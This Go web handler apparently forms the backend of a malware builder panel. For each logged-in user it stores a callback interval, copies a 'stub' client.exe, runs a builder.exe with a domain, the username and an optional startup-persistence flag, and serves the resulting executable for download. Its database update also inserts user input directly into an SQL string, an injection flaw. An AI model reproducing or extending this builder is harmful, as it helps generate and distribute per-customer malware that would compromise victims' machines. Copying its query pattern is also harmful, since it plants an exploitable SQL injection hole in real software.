package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"utils"
)

func buildStub(c *gin.Context) {
	interval := c.PostForm("interval")
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	startup := c.PostForm("startup")
	if interval != "" {
		if username != nil || password != nil {
			if isUserExists(username.(string)) {
				if isUserValid(username.(string), password.(string)) {
					db, err := sql.Open("mysql", dbQuery)
					if err != nil {
						fmt.Println(err)
					}
					defer db.Close()
					intervalInt, _ := strconv.Atoi(interval)
					if intervalInt < 30 {
						interval = "30"
					}
					query := fmt.Sprintf("UPDATE users SET inteval=\"%s\" WHERE username=\"%s\"", interval, username)
					_, err = db.Exec(query)
										if err != nil {
						fmt.Println(err)
					}
					var startupBool bool
					if startup == "on" {
						startupBool = true
					} else {
						startupBool = false
					}
					rndBuilt := buildFile(username.(string), startupBool)
					exeDir := fmt.Sprintf("%s\\client.exe", rndBuilt)
					c.Header("Content-Description", "File Transfer")
					c.Header("Content-Transfer-Encoding", "binary")
					c.Header("Content-Disposition", "attachment; filename=" + "client.exe" )
					c.Header("Content-Type", "application/octet-stream")
					c.File(exeDir)
					defer os.RemoveAll(rndBuilt)
				}
			}
		}
	}
}

func buildFile(username string, startup bool) string {
	current, _ := os.Getwd()
	rndStr := utils.RandomString(10, true)
	err := os.Mkdir(current + "\\" + rndStr, 0777)
	if err != nil {
		fmt.Println(err)
	}
	copyFile(current + "\\" + "stub\\builder.exe", current + "\\" + rndStr + "\\builder.exe")
	copyFile(current + "\\" + "stub\\client.exe", current + "\\" + rndStr + "\\client.exe")
	if err != nil {
		fmt.Println(err)
	}
	startupStr := "nop"
	if startup {
		startupStr = "use"
	}
	builder := exec.Command(current + "\\" + rndStr + "\\builder.exe", "client.exe", domain, username, startupStr)
	builder.Dir = current + "\\" + rndStr
	_, err = builder.CombinedOutput()
	if err != nil {
		fmt.Println(err)
	}
	return rndStr
}

func copyFile(src, dst string) {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		fmt.Println(err)
	}
	ioutil.WriteFile(dst, data, 0666)
}


